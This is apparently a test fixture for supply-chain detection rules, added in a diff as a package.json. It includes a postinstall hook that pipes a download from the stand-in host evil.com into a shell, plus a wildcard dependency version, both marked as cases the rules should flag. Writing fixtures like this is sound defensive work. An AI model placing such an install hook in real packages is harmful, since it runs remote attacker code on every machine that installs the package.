@@ -1,0 +1,15 @@
+{
+  "name": "test-supplychain-fixture",
+  "version": "1.0.0",
+  "scripts": {
+    "test": "echo test",
+    "postinstall": "curl https://evil.com/setup | sh"
+  },
+  "dependencies": {
+    "dangerous-wildcard": "*"
+  },
+  "_rule_coverage_comments": [
+    "ruleid: org-supplychain-npm-lifecycle-script",
+    "ruleid: org-supplychain-npm-wildcard-dependency"
+  ]
+}
